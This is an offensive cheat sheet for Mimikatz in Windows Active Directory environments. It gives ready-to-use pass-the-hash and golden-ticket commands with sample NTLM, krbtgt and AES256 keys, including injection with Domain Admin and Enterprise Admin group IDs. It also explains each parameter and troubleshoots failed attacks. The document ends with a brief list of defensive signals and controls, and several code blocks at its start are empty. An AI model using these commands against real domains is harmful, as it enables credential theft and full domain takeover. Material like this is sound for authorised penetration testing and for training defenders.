## Overview

Mimikatz is commonly used in Windows and Active Directory labs to interact with credential material, Kerberos tickets, DPAPI data, certificates, vault entries, LSASS memory, and domain replication functionality.

This cheat sheet groups common commands by module and use case.

> [!important]
> Use only in authorised labs, CTFs, exams, and professional assessments with explicit permission.

---

```text

```

```text

```

```text

```

```text

export Kerberos tickets from LSASS to .kirbi files
```


# Pass the Hash / Overpass the Hash

```text
sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a
```



# Golden and Silver Ticket Examples

## Golden Ticket for User and Save to File

```text
kerberos::golden /user:utilisateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /id:1107 /groups:513 /ticket:utilisateur.chocolate.kirbi
```

Purpose:

```text
create a ticket for utilisateur and save it to a .kirbi file
```

---

## Golden Ticket with AES256 and Inject

```text
kerberos::golden /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /aes256:15540cac73e94028231ef86631bc47bd5c827847ade468d6f6f739eb00c68e42 /user:Administrateur /id:500 /groups:513,512,520,518,519 /ptt /startoffset:-10 /endin:600 /renewmax:10080
```

Purpose:

```text
create and inject a ticket using AES256 key material
```

Group IDs shown:

```text
513
512
520
518
519
```

Common interpretation:

```text
513 = Domain Users
512 = Domain Admins
520 = Group Policy Creator Owners
518 = Schema Admins
519 = Enterprise Admins
```

---

## Golden Ticket Save to File

```text
kerberos::golden /admin:Administrator /domain:CTU.DOMAIN /sid:S-1-1-12-123456789-1234567890-123456789 /krbtgt:deadbeefboobbabe003133700009999 /ticket:Administrator.kiribi
```

Purpose:

```text
create a Kerberos ticket and save it to disk
```

> [!note]
> The example file extension is written as `.kiribi` in the source command. Mimikatz examples commonly use `.kirbi`, but this note preserves the original command as provided.

# Important Parameters

| Parameter | Meaning |
|---|---|
| `/user` | Target username |
| `/admin` | Admin/user field used in some ticket examples |
| `/domain` | Domain name |
| `/sid` | Domain SID |
| `/krbtgt` | NTLM hash of krbtgt account |
| `/ntlm` | NTLM hash |
| `/aes256` | AES256 Kerberos key |
| `/run` | Process to start after PTH |
| `/ticket` | Save generated ticket to file |
| `/ptt` | Pass the ticket immediately |
| `/id` | User RID |
| `/groups` | Group RIDs to include |
| `/startoffset` | Ticket start offset |
| `/endin` | Ticket lifetime |
| `/renewmax` | Maximum renewal time |
| `/export` | Export output objects to disk |
| `/machine` | Machine-level crypto key context |
| `/systemstore` | Certificate store selection |

# Troubleshooting

## `privilege::debug` Fails

Possible causes:

```text
not running as administrator
missing SeDebugPrivilege
UAC restrictions
EDR/security control blocking access
```

---

## `sekurlsa::logonpasswords` Returns Little Data

Possible causes:

```text
not elevated
LSASS protection enabled
Credential Guard enabled
no useful logon sessions
modern Windows protections
```

---

## Tickets Do Not Work After PTT

Check:

```text
ticket service type
ticket target hostname
domain name
time skew
current logon session
whether service uses Kerberos
whether you used hostname instead of IP
```

Useful commands outside Mimikatz:

```cmd
klist
```

---

## PTH Process Starts but Access Fails

Check:

```text
target accepts NTLM
account has local admin or required access
firewall allows target protocol
you are using correct domain/user format
hash is correct
service requires Kerberos instead of NTLM
```

---

## Golden Ticket Fails

Check:

```text
domain SID
domain name
krbtgt hash or AES key
existing username
hostname vs IP usage
time skew
ticket groups
current ticket cache
```

Use:

```text
kerberos::purge
```

before injecting a new ticket if needed.

# Defensive Notes

Mimikatz usage may generate or relate to:

```text
LSASS access
SeDebugPrivilege use
ticket export or injection
suspicious Kerberos ticket behavior
DCSync replication requests
certificate/key export
vault access
SAM/LSA secret access
PowerShell or process execution telemetry
```

Common defensive controls:

```text
Credential Guard
LSASS protection
EDR monitoring
limiting local administrator rights
tiered admin model
restricting interactive admin logons
monitoring DCSync rights
monitoring Kerberos anomalies
rotating krbtgt after compromise
protecting certificate private keys
```
